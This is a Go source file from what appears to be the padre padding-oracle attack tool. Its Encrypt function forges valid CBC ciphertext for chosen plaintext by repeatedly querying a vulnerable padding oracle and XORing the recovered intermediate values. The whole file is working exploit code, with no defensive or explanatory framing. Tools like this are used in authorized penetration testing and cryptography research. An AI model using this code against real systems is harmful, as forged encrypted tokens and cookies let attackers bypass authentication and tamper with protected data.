package exploit

import (
	"fmt"

	"github.com/glebarez/padre/pkg/util"
)

func (p *Padre) Encrypt(plainText string, byteStream chan byte) ([]byte, error) {
	blockLen := p.BlockLen

	// pad
	plainText = Pkcs7Pad(plainText, blockLen)

	// count the blocks
	blockCount := len(plainText) / blockLen

	// initialize a slice that will contain our cipherText (blockCount + 1 for IV)
	cipher := make([]byte, (blockLen * (blockCount + 1)))

	// last block is generated randomly
	lastBlock := util.RandomSlice(blockLen)
	copy(cipher[len(cipher)-blockLen:], lastBlock)

	// the last block is already known, so we can fetch the bytes
	// NOTE: they are fetcher in reverse order, just like any other byte throughout this exploit
	if byteStream != nil {
		for i := len(lastBlock) - 1; i >= 0; i-- {
			byteStream <- lastBlock[i]
		}
	}

	/* Start with the last block and move towards the 1st block.
	Each block is used successively as a IV and then as a cipherText in the next iteration */
	for blockNum := blockCount; blockNum >= 1; blockNum-- {
		// mark indexes
		x := (blockNum - 1) * blockLen
		y := blockNum * blockLen
		z := (blockNum + 1) * blockLen

		plainBlock := []byte(plainText)[x:y]

		// get nulling IV
		nullingIV, err := p.breakCipher(cipher[y:z], newXORingStreamer(plainBlock, byteStream))
		if err != nil {
			return nil, fmt.Errorf("error occurred while encrypting block %d: %w", blockNum, err)
		}

		// reveal the cipher
		copy(cipher[x:y], xorSlices(plainBlock, nullingIV))
	}
	return cipher, nil
}
